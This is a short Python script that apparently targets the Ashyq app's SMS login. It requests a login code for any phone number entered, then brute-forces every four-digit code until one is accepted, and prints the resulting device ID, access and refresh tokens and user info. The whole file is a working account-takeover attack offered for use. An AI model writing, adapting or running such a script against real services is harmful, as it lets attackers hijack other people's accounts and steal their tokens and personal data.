from ashyq import Ashyq, exceptions


# Init class and set phone number
phone_number = input('Input phone number: ')
ashyq = Ashyq(phone_number)


# SMS (login) request
ashyq.new_install()


i = 1

while i <= 9999:
    code = '{:04}'.format(i)

    try:
        # Join by received SMS
        ashyq.connect(code)

        # If succesfully logged_on
        break

    except exceptions.AshyqException:
        print('Passed:', code)
        i += 1


if ashyq.logged_on:
    print('Logged on!')

    print('Device ID:', ashyq.device_id)
    print('Access token:', ashyq.access_token)
    print('Refresh token:', ashyq.refresh_token)
    print('User info:', ashyq.user)
